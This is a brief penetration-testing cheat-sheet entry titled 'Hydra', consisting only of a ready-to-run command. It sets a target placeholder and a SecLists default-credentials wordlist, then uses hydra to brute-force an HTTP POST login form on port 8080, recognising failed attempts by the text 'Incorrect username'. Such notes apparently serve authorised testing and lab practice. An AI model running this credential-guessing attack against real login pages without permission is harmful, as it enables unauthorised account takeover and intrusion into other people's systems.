# Hydra

### Default Credentials
```bash
export TARGET="{{TARGET}}"
export WORDLIST="/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"

hydra -C $WORDLIST http://$TARGET -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^&Submit=Login:F=Incorrect username"
```